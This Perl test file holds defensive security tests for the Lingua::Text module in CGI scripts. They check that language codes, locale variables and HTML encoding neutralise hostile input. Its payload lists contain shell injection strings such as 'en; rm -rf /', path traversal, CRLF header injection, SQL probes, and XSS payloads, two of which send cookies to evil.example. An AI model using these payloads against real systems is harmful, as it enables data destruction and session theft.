#!/usr/bin/env perl
# t/cgi_security.t -- Penetration tests for Lingua::Text used inside CGI scripts.
#
# THREAT MODEL
# Lingua::Text is a multilingual data container that CGI scripts use to store
# translations and reflect them in HTTP responses.  The module reads locale
# environment variables that in CGI mode are set by the web server from
# attacker-supplied HTTP request headers (Accept-Language, LANG, etc.).
# Attacker-controlled text may also be passed to set() or the AUTOLOAD
# accessors and later embedded in HTML output.
#
# ATTACK SURFACES TESTED
#   1. lang code injection via set(lang => $attacker_input)
#   2. Locale env var injection (LANG, LC_ALL, LANGUAGE, HTTP_ACCEPT_LANGUAGE)
#   3. XSS payloads stored as translation text
#   4. CRLF / header injection via lang code
#   5. Null byte injection in lang keys
#   6. Oversized inputs
#   7. Return value contract (API invariants)

use strict;
use warnings;

use Test::Most;
use Test::Carp;
use Test::Returns;
use Readonly;

BEGIN {
	use_ok('Lingua::Text') or BAIL_OUT('Cannot load Lingua::Text -- all security tests invalid');
}

# ---------------------------------------------------------------------------
# Hostile payload constants
# Defined once here so every subtest uses the same canonical payload list.
# ---------------------------------------------------------------------------

# Shell metacharacters in a lang value -- exploit mechanism: if the lang code
# is passed to system() or a shell, these would execute arbitrary commands.
Readonly::Array my @CMD_INJECTION_LANGS => (
	'en; rm -rf /',
	'en|cat /etc/passwd',
	'en`id`',
	'en$(hostname)',
	'$(echo rce)',
	'; ls -la',
	'| whoami',
	'`uname -a`',
);

# Path traversal strings in a lang value -- exploit mechanism: if the lang code
# is used as a filename or hash key fed to a file-open call, these would escape
# the intended directory or load sensitive files.
Readonly::Array my @PATH_TRAVERSAL_LANGS => (
	'../../../etc/passwd',
	'/etc/passwd',
	'en/../../../etc',
	'....//....//etc',
	'..%2F..%2F..%2Fetc%2Fpasswd',
);

# CRLF sequences in a lang value -- exploit mechanism: if the lang code is
# reflected in an HTTP header (e.g. Content-Language: $lang), CR+LF chars
# allow injecting extra headers or splitting the HTTP response.
Readonly::Array my @CRLF_LANGS => (
	"en\r\nX-Injected: evil",
	"fr\nX-Injected: evil",
	"de\r\nSet-Cookie: session=hijacked",
	"en\r\n\r\n<script>alert(1)</script>",
);

# Null bytes in a lang value -- exploit mechanism: in C-level string handling,
# a null byte truncates the string, potentially bypassing prefix validation
# while corrupting the stored key.
Readonly::Array my @NULL_BYTE_LANGS => (
	"en\x00",
	"\x00en",
	"e\x00n",
	"en\x00 UNION SELECT",
);

# XSS payloads -- exploit mechanism: if a translation is reflected in HTML
# output without encode(), the browser executes the injected script.
Readonly::Array my @XSS_PAYLOADS => (
	'<script>alert(1)</script>',
	'"><script>alert(document.cookie)</script>',
	"');alert(document.domain)//",
	'<img src=x onerror=alert(1)>',
	'<svg onload=alert(1)>',
	"<iframe src=\"javascript:alert('xss')\">",
	'<body onload=alert(1)>',
	'<a href="javascript:evil()">click</a>',
);

# HTML special characters that encode() must transform to safe entities.
# Each pair is [raw_input, expected_entity_form].
Readonly::Array my @ENTITY_CASES => (
	[ '<b>bold</b>',      '&lt;b&gt;bold&lt;/b&gt;'   ],
	[ '&amp;',            '&amp;amp;'                  ],
	[ '"quoted"',         '&quot;quoted&quot;'         ],
	[ "it's",             'it&#39;s'                   ],
	[ 'a<b>&c',           'a&lt;b&gt;&amp;c'           ],
);

# Hostile locale environment variable values that contain both a valid 2-letter
# prefix (so the module successfully extracts a lang code) AND extra hostile
# content.  The module must extract only the 2-letter prefix and discard the rest.
Readonly::Hash my %HOSTILE_LANG_ENV => (
	'en; rm -rf /'       => 'en',
	'en|cat /etc/passwd' => 'en',
	'en`id`'             => 'en',
	'en$(hostname)'      => 'en',
	"en\r\nX-Inject: x"  => 'en',
	'fr_FR.UTF-8|echo x' => 'fr',
	'de_DE.UTF-8; id'    => 'de',
);

# ---------------------------------------------------------------------------
# SECTION 1: lang code validation in set()
#
# The set() method must accept only well-formed ISO 639-1 codes
# (^[a-z]{2}(?:_[A-Z]{2})?$) and carp+return-undef for everything else.
# This is the primary guard protecting the module invariant:
#   dom(texts) ⊆ LANG   (every stored key is a valid language code)
# ---------------------------------------------------------------------------

subtest 'set() -- command injection payloads rejected by lang validator' => sub {
	# Mechanism: if lang code were passed to system() / exec() / backtick,
	# metacharacters like |, ;, ` would execute arbitrary shell commands.
	# Defence: $LANG_RE = qr/^[a-z]{2}(?:_[A-Z]{2})?$/ has no room for these.

	for my $payload (@CMD_INJECTION_LANGS) {
		local %ENV;
		my $t = Lingua::Text->new();
		my $warned = 0;
		local $SIG{__WARN__} = sub { $warned++ };

		my $ret = $t->set(text => 'hello', lang => $payload);

		ok($warned, "carp fired for command injection lang: $payload");
		ok(!defined($ret), "set() returned undef for command injection lang");

		# Verify the payload string was NOT saved as a texts key.
		ok(!exists($t->{'texts'}{$payload}),
			"command injection payload not stored as a lang key");
	}
};

subtest 'set() -- path traversal payloads rejected by lang validator' => sub {
	# Mechanism: if lang code were used as a filename or path component,
	# '../..' sequences would escape the intended directory.
	# Defence: $LANG_RE rejects any character outside [a-z_A-Z].

	for my $payload (@PATH_TRAVERSAL_LANGS) {
		local %ENV;
		my $t = Lingua::Text->new();
		my $warned = 0;
		local $SIG{__WARN__} = sub { $warned++ };

		$t->set(text => 'hello', lang => $payload);

		ok($warned, "carp fired for path traversal lang: $payload");
		ok(!exists($t->{'texts'}{$payload}),
			"path traversal payload not stored as a lang key");
	}
};

subtest 'set() -- CRLF header-injection payloads rejected by lang validator' => sub {
	# Mechanism: if lang code is reflected in a Content-Language HTTP header
	#   print "Content-Language: $lang\n";
	# injecting CR+LF lets the attacker add arbitrary headers or body content.
	# Defence: $LANG_RE does not permit \r or \n.

	for my $payload (@CRLF_LANGS) {
		local %ENV;
		my $t = Lingua::Text->new();
		my $warned = 0;
		local $SIG{__WARN__} = sub { $warned++ };

		$t->set(text => 'hello', lang => $payload);

		ok($warned, "carp fired for CRLF injection lang");

		# Verify no key containing CR or LF was stored -- an unfound key means
		# the Content-Language header cannot be split by attacker-controlled data.
		my @crlf_keys = grep { /[\r\n]/ } keys %{ $t->{'texts'} };
		ok(!@crlf_keys, "no CRLF character in any stored lang key");
	}
};

subtest 'set() -- null byte payloads rejected by lang validator' => sub {
	# Mechanism: null bytes (\x00) terminate strings at the C layer.
	# "en\x00 UNION SELECT" could bypass prefix validation while the C-level
	# string is just "en", potentially corrupting the hash key.
	# Defence: $LANG_RE treats \x00 as a non-[a-z] character and rejects it.

	for my $payload (@NULL_BYTE_LANGS) {
		local %ENV;
		my $t = Lingua::Text->new();
		my $warned = 0;
		local $SIG{__WARN__} = sub { $warned++ };

		$t->set(text => 'hello', lang => $payload);

		ok($warned, "carp fired for null byte in lang");
		my @null_keys = grep { /\x00/ } keys %{ $t->{'texts'} };
		ok(!@null_keys, "no null byte in any stored lang key");
	}
};

subtest 'set() -- mixed-case and near-miss lang codes rejected' => sub {
	# Mechanism: a naive regex like /^[a-zA-Z]{2}$/ would accept 'EN', 'Fr',
	# etc.  If a CGI script uses the returned lang code directly in a
	# case-sensitive lookup or header, it could produce unexpected output.
	# Defence: $LANG_RE is case-sensitive (lowercase lang, uppercase country).

	Readonly::Array my @NEAR_MISS_LANGS => (
		'EN',     # uppercase -- not accepted
		'Fr',     # mixed case
		'eN',     # mixed case
		'en_us',  # lowercase country suffix
		'EN_US',  # uppercase lang code
	);

	for my $payload (@NEAR_MISS_LANGS) {
		local %ENV;
		my $t = Lingua::Text->new();
		my $warned = 0;
		local $SIG{__WARN__} = sub { $warned++ };

		$t->set(text => 'hello', lang => $payload);

		ok($warned, "carp fired for near-miss lang code '$payload'");
		ok(!exists($t->{'texts'}{$payload}),
			"near-miss lang code '$payload' not stored");
	}
};

subtest 'set() -- valid lang codes accepted at all boundaries' => sub {
	# Positive test: confirm the validator does NOT block legitimate codes.

	Readonly::Array my @VALID_LANGS => qw(en fr de zh es ja ko pt it ru ar);
	Readonly::Array my @VALID_REGIONAL => qw(en_US en_GB zh_CN zh_TW fr_FR de_DE);

	for my $lang (@VALID_LANGS, @VALID_REGIONAL) {
		local %ENV;
		my $t = Lingua::Text->new();
		my $result = $t->set(text => 'test', lang => $lang);
		isa_ok($result, 'Lingua::Text',
			"set() returns \$self for valid lang '$lang'");
		is($t->as_string($lang), 'test',
			"translation stored and retrievable for '$lang'");
	}
};

# ---------------------------------------------------------------------------
# SECTION 2: Locale environment variable injection
#
# In CGI mode the web server exposes HTTP headers as environment variables.
# _get_language() reads LANG, LC_ALL, LC_MESSAGES, LANGUAGE, and (via
# I18N::LangTags::Detect) HTTP_ACCEPT_LANGUAGE.
# An attacker can craft any value for these headers.
# The module must extract ONLY the two-letter language code and discard the rest.
# ---------------------------------------------------------------------------

subtest '_get_language() -- hostile LANG values safely neutralized' => sub {
	# Mechanism: a CGI environment where LANG is derived from an HTTP header
	# might contain shell metacharacters after the locale string.
	# Defence: _get_language() extracts just the first [a-z]{2} match via regex.
	# The extracted code is then validated by _is_valid_language().
	# Shell metacharacters after the lang code are silently discarded.

	for my $hostile (sort keys %HOSTILE_LANG_ENV) {
		my $expected_lang = $HOSTILE_LANG_ENV{$hostile};
		local %ENV;
		$ENV{LANG} = $hostile;
		delete $ENV{LANGUAGE};
		delete $ENV{LC_ALL};
		delete $ENV{LC_MESSAGES};
		delete $ENV{HTTP_ACCEPT_LANGUAGE};

		my $t = Lingua::Text->new(en => 'hello', fr => 'bonjour', de => 'hallo');

		# The result must equal the SAFE translation for the extracted lang code --
		# it must NEVER contain any part of the hostile payload.
		my $result = $t->as_string();
		my $expected_text = $t->$expected_lang();
		is($result, $expected_text,
			"LANG='$hostile' safely extracts '$expected_lang', payload discarded");
		unlike($result // '', qr/rm|cat|id|hostname|echo|Inject/,
			"result contains no part of the hostile payload");
	}
};

subtest '_get_language() -- LANG values with no valid prefix produce undef' => sub {
	# These values contain no leading two-letter alpha sequence, or the first
	# two-letter match fails _is_valid_language() (e.g. '12').
	# The module must return undef and not crash or execute anything.

	Readonly::Array my @NO_LANG_ENVS => (
		'../../../etc/passwd',
		'/etc/passwd',
		'$(id)',
		'; hostile code',
		'123',
		'',
		"\x00en",    # null byte before the lang code
	);

	for my $val (@NO_LANG_ENVS) {
		local %ENV;
		$ENV{LANG} = $val;
		delete $ENV{LANGUAGE};
		delete $ENV{LC_ALL};
		delete $ENV{LC_MESSAGES};
		delete $ENV{HTTP_ACCEPT_LANGUAGE};

		my $t = Lingua::Text->new(en => 'hello');
		# When LANG has no valid lang prefix, as_string() carps -- suppress
		# that expected carp so it does not appear as noise in the test runner.
		my $result;
		{
			local $SIG{__WARN__} = sub {};
			$result = eval { $t->as_string() };
		}
		ok(!$@, "no exception from hostile LANG='$val'");
		# as_string() returned undef (carp was emitted, now suppressed).
		# Verify the module did not reflect any part of the hostile payload.
		unlike($result // '', qr/etc|passwd|\$\(|hostile/,
			"result does not reflect hostile LANG content");
	}
};

subtest '_get_language() -- hostile HTTP_ACCEPT_LANGUAGE safely parsed' => sub {
	# Mechanism: in CGI mode I18N::LangTags::Detect reads HTTP_ACCEPT_LANGUAGE,
	# which is set by the web server directly from the attacker's browser header.
	# A hostile Accept-Language like "<script>alert(1)</script>" could, in a
	# naive implementation, be reflected in output or cause parse errors.
	# Defence: I18N::LangTags::Detect's parser accepts only valid BCP 47 tags.
	# The two-letter prefix extraction then adds a second validation layer.

	Readonly::Array my @HOSTILE_ACCEPT_LANGS => (
		'<script>alert(1)</script>',
		'../../../etc/passwd',
		"en\r\nX-Injected: evil",
		'${7*7}',                             # SSTI probe
		"en\x00fr",                           # null byte in header
		'UNION SELECT * FROM users--',        # SQL injection probe
		'"><img src=x onerror=alert(1)>',
		'; DROP TABLE translations;--',
	);

	for my $payload (@HOSTILE_ACCEPT_LANGS) {
		local %ENV;
		delete $ENV{LANG};
		delete $ENV{LC_ALL};
		delete $ENV{LC_MESSAGES};
		delete $ENV{LANGUAGE};
		$ENV{HTTP_ACCEPT_LANGUAGE} = $payload;

		my $t = Lingua::Text->new(en => 'hello', fr => 'bonjour');

		# Must not throw; must not reflect the raw payload in the output.
		# When the payload contains no valid lang tag, as_string() carps -- suppress
		# that expected warning so it does not pollute the test runner output.
		my $result;
		{
			local $SIG{__WARN__} = sub {};
			$result = eval { $t->as_string() };
		}
		ok(!$@, "no exception for hostile HTTP_ACCEPT_LANGUAGE: $payload");
		if(defined($result)) {
			unlike($result, qr/script|passwd|SELECT|Injected|DROP|onerror/i,
				"result does not reflect hostile Accept-Language payload");
		}
	}
};

subtest '_get_language() -- LANGUAGE colon-list injection neutralized' => sub {
	# LANGUAGE supports colon-separated preference lists (GNU gettext convention).
	# An attacker might try to inject shell code after the colon.
	# Defence: _get_language() uses a regex that stops at the first [a-z]{2} match.

	local %ENV;
	delete $ENV{LANG};
	delete $ENV{LC_ALL};
	delete $ENV{LC_MESSAGES};
	delete $ENV{HTTP_ACCEPT_LANGUAGE};
	$ENV{LANGUAGE} = 'fr:en; hostile';

	my $t = Lingua::Text->new(en => 'hello', fr => 'bonjour');
	my $result = $t->as_string();

	# The module should resolve to 'fr' (first code in the list).
	ok(!defined($result) || $result =~ /^(hello|bonjour)$/,
		"LANGUAGE colon-list with hostile tail returns safe translation");
	unlike($result // '', qr/hostile/,
		"hostile content after colon not reflected");
};

# ---------------------------------------------------------------------------
# SECTION 3: XSS via text storage
#
# Lingua::Text stores translation text verbatim -- this is by design, since
# the text may contain legitimate markup in some contexts.  The module
# provides encode() to convert dangerous characters to HTML entities.
# Tests here verify:
#   (a) raw text is returned verbatim WITHOUT encode() (expected behaviour)
#   (b) encode() correctly neutralises all known XSS vectors
#   (c) encode() via set() and AUTOLOAD setter paths both work
# ---------------------------------------------------------------------------

subtest 'encode() -- XSS payloads HTML-entity encoded correctly' => sub {
	# Mechanism: attacker injects XSS payload as translation text via a form or API.
	# Without encode(), the text is reflected in HTML and the browser executes it.
	# Defence: encode() converts < > " ' & to safe HTML entities.

	for my $payload (@XSS_PAYLOADS) {
		local %ENV;
		my $t = Lingua::Text->new(en => $payload);

		# Before encoding: raw payload is returned (caller must encode before output).
		is($t->en(), $payload,
			"raw XSS payload stored verbatim before encode()");

		# After encoding: angle brackets and special chars become HTML entities.
		$t->encode();
		my $encoded = $t->en();

		# Security property: NO raw '<letter' or '</letter' sequences may remain.
		# encode() converts HTML-special chars (<>&"') only -- it does NOT strip
		# attribute names like onerror= or javascript:, but those strings become
		# inert once the surrounding angle brackets are entity-encoded.
		# Proof: a browser cannot parse '<img ...' as an element when it reads
		# '&lt;img ...'; the onerror handler inside can never fire.
		unlike($encoded, qr/<[a-zA-Z\/]/,
			"encode() leaves no raw '<tag' opener in: $payload");

		# If the payload contained HTML-special chars, the output must use entities.
		if($payload =~ /[<>"'&]/) {
			like($encoded, qr/&(?:lt|gt|amp|quot|#\d+);/,
				"encode() produced HTML entities from: $payload");
		}
	}
};

subtest 'encode() -- HTML entity cases are exact' => sub {
	# Verify the entity translations match what browsers parse as safe.

	for my $case (@ENTITY_CASES) {
		my ($input, $expected) = @{$case};
		local %ENV;
		my $t = Lingua::Text->new(en => $input)->encode();
		is($t->en(), $expected, "encode('$input') => '$expected'");
	}
};

subtest 'encode() -- XSS payload stored via set() is encoded' => sub {
	# The encode() protection must work regardless of which setter was used.
	Readonly::Scalar my $XSS => '<img src=x onerror=fetch("//evil.example/"+document.cookie)>';

	local %ENV;
	my $t = Lingua::Text->new();
	$t->set(text => $XSS, lang => 'en');
	$t->encode();

	my $encoded = $t->en();
	unlike($encoded, qr/<[a-zA-Z]/,  'encode() after set() leaves no raw <tag opener');
	like($encoded, qr/&lt;img/i,    'encode() after set() produces &lt;img entity');
};

subtest 'encode() -- XSS payload stored via AUTOLOAD setter is encoded' => sub {
	# AUTOLOAD setter path ($t->en($xss)) must also be covered by encode().
	Readonly::Scalar my $XSS =>
		'<script>document.location="https://evil.example/?c="+document.cookie</script>';

	local %ENV;
	my $t = Lingua::Text->new();
	$t->en($XSS);    # AUTOLOAD setter
	$t->encode();

	my $encoded = $t->en();
	unlike($encoded, qr/<script/i,  'encode() after AUTOLOAD removes <script');
	like($encoded, qr/&lt;script/i, 'encode() after AUTOLOAD produces &lt;script entity');
};

subtest 'encode() -- double-encode is a documented pitfall, not a bypass' => sub {
	# An attacker submitting pre-encoded text like "&lt;script&gt;" might expect
	# a double-decode somewhere.  Verify the first encode() encodes ampersands,
	# so a second call double-encodes (produces &amp;lt;) -- the text is still
	# safe HTML but may render incorrectly.  This is the documented pitfall.
	local %ENV;
	my $t = Lingua::Text->new(fr => "\x{E9}tude")->encode()->encode();
	is($t->fr(), '&amp;eacute;tude',
		'double-encode produces &amp;eacute; (documented pitfall, not a bypass)');
};

# ---------------------------------------------------------------------------
# SECTION 4: AUTOLOAD -- dispatch boundary security
#
# AUTOLOAD intercepts method calls.  An attacker who can trigger arbitrary
# method calls (e.g. through a dynamic dispatch like $t->$method()) might
# attempt to reach private helpers or DESTROY.  The gate /^[a-z]{2}$/ limits
# AUTOLOAD to exactly two-lowercase-letter names.
# ---------------------------------------------------------------------------

subtest 'AUTOLOAD -- non-lang method names silently rejected' => sub {
	# Mechanism: if an attacker causes $t->$name() for a controlled $name, names
	# like 'DESTROY', '_err', or 'new' must not be dispatched to internal methods.
	# Defence: /^[a-z]{2}$/ (no i-flag) is a strict two-lowercase-letter gate.

	Readonly::Array my @BLOCKED_NAMES => (
		'DESTROY',       # special Perl method
		'new',           # constructor -- 3 chars
		'set',           # public API method name -- 3 chars
		'_er',           # private helper prefix
		'EN',            # uppercase (bypasses case-insensitive naive regex)
		'Fr',            # mixed case
		'xyz',           # three lowercase letters
		'e',             # one letter
		'a1',            # alphanumeric
		'__',            # underscores
	);

	for my $name (@BLOCKED_NAMES) {
		local %ENV;
		my $t = Lingua::Text->new(en => 'hello');
		# Call via the AUTOLOAD path only if the name is not already a declared method.
		# Names like 'new', 'set' go to their declared subs, not AUTOLOAD.
		next if $t->can($name);

		my $result = $t->$name();
		ok(!defined($result), "AUTOLOAD silently rejects method '$name'");
	}
};

subtest 'AUTOLOAD -- uppercase variant does not reach valid getter' => sub {
	# Mechanism: a naive case-insensitive regex like /^[a-zA-Z]{2}$/i would let
	# 'EN' fetch the same value as 'en', creating a case-confusion bypass where
	# the attacker uses 'EN' in a param that the code normalises to uppercase.
	# Defence: the module dropped the /i flag; 'EN' fails /^[a-z]{2}$/.

	local %ENV;
	my $t = Lingua::Text->new();
	$t->set(text => 'Hello', lang => 'en');

	ok(!defined($t->EN()), "EN() (uppercase) cannot read en translation via AUTOLOAD");
};

# ---------------------------------------------------------------------------
# SECTION 5: Return value contract (Test::Returns)
#
# Verifies that each API method returns exactly the type it promises,
# under both success and failure conditions.  Attacker-controlled inputs
# must not cause the module to return an unexpected type that could
# confuse error-handling code (e.g. returning an object where undef is
# expected causes defined() guards to fail).
# ---------------------------------------------------------------------------

subtest 'return type contracts -- new()' => sub {
	local %ENV;

	# isa_ok used instead of returns_ok because Lingua::Text overloads ""
	# and Test::Returns does "$ret eq $value" which triggers as_string(),
	# which carps when no locale is set.
	my $obj = Lingua::Text->new();
	isa_ok($obj, 'Lingua::Text', 'new() returns Lingua::Text on empty call');

	my $obj2 = Lingua::Text->new(en => 'hello', fr => 'bonjour');
	isa_ok($obj2, 'Lingua::Text', 'new() returns Lingua::Text with translations');

	# Misuse path: function-style call with non-class invocant must return undef
	# so callers can detect the error with defined().
	my $bad;
	{
		my $warned = 0;
		local $SIG{__WARN__} = sub { $warned++ };
		$bad = Lingua::Text::new('notaclass', en => 'x');
	}
	ok(!defined($bad), 'new() returns undef (not an object) on misuse');
};

subtest 'return type contracts -- set()' => sub {
	local %ENV;
	my $t = Lingua::Text->new();

	# Success: $self is returned so callers can chain.
	my $success = $t->set(text => 'Hello', lang => 'en');
	isa_ok($success, 'Lingua::Text', 'set() returns Lingua::Text ($self) on success');

	# Failure: must return undef so callers can write "defined($t->set(...))"
	# to detect failure without an exception.
	my $fail;
	{
		my $warned = 0;
		local $SIG{__WARN__} = sub { $warned++ };
		$fail = $t->set(text => 'hello', lang => 'INVALID_LANG_THAT_IS_WAY_TOO_LONG');
	}
	ok(!defined($fail), 'set() returns undef for invalid lang');

	my $fail2;
	{
		my $warned = 0;
		local $SIG{__WARN__} = sub { $warned++ };
		$fail2 = $t->set(text => undef, lang => 'en');
	}
	ok(!defined($fail2), 'set() returns undef for undef text');
};

subtest 'return type contracts -- as_string()' => sub {
	local %ENV;
	$ENV{LANG} = 'en_US.UTF-8';

	my $t = Lingua::Text->new(en => 'hello');

	# Translation exists: scalar string returned.
	my $found = $t->as_string('en');
	returns_ok($found, { type => 'scalar' },
		'as_string() returns scalar when translation is found');

	# Translation absent: undef returned silently (no carp).
	my $warned = 0;
	local $SIG{__WARN__} = sub { $warned++ };
	my $not_found = $t->as_string('de');
	ok(!defined($not_found), 'as_string() returns undef when lang not stored');
	ok(!$warned, 'as_string() does not carp when translation simply absent');
};

subtest 'return type contracts -- encode()' => sub {
	local %ENV;
	my $t = Lingua::Text->new(en => 'hello', fr => "\x{E9}tude");
	my $result = $t->encode();

	# encode() must return $self so it can be chained: ->new(...)->encode().
	isa_ok($result, 'Lingua::Text', 'encode() returns Lingua::Text ($self) for chaining');
	# Use Scalar::Util::refaddr to compare object identity without triggering
	# the stringify overload (which would carp with no locale set).
	require Scalar::Util;
	ok(Scalar::Util::refaddr($result) == Scalar::Util::refaddr($t),
		'encode() returns the exact same object reference (not a copy)');
};

# ---------------------------------------------------------------------------
# SECTION 6: Object invariant -- dom(texts) contains only valid lang keys
#
# After any sequence of API calls, every key in $t->{'texts'} must be
# a valid ISO 639-1 code matching $LANG_RE.  This invariant is what
# prevents lang injection from corrupting object state.
# ---------------------------------------------------------------------------

subtest 'object invariant -- hostile lang keys are never stored' => sub {
	# Note: Object::Configure may inject non-lang keys (e.g. 'logger') via
	# Lingua::Text->new() -- that is a known limitation, not a security issue,
	# because those keys are not attacker-controlled.  This test therefore checks
	# only that the specific hostile payloads are absent from the texts hash.

	local %ENV;
	my $t = Lingua::Text->new(en => 'hello', fr => 'bonjour');

	# Record what keys are present BEFORE the hostile calls.
	my %baseline = map { $_ => 1 } keys %{ $t->{'texts'} };

	# Attempt to insert hostile lang codes via every write path.
	Readonly::Array my @HOSTILE_LANGS_TO_TRY => (
		'en; hostile',
		'../etc',
		"en\r\nX-Inject: x",
		'abc',
		'EN',
		'| whoami',
		"en\x00",
	);

	{
		local $SIG{__WARN__} = sub {};    # suppress expected carp noise
		for my $lang (@HOSTILE_LANGS_TO_TRY) {
			$t->set(text => 'hostile', lang => $lang);
		}
	}

	# Every hostile payload must be absent from the stored keys.
	for my $lang (@HOSTILE_LANGS_TO_TRY) {
		ok(!exists($t->{'texts'}{$lang}),
			"hostile lang '$lang' was NOT stored as a texts key");
	}

	# The only new keys allowed are those added by the test with VALID lang codes.
	# (In this test we didn't add any valid ones after baseline.)
	my @new_keys = grep { !$baseline{$_} } keys %{ $t->{'texts'} };
	ok(!@new_keys,
		"no new keys added to texts by hostile set() calls");
};

done_testing();
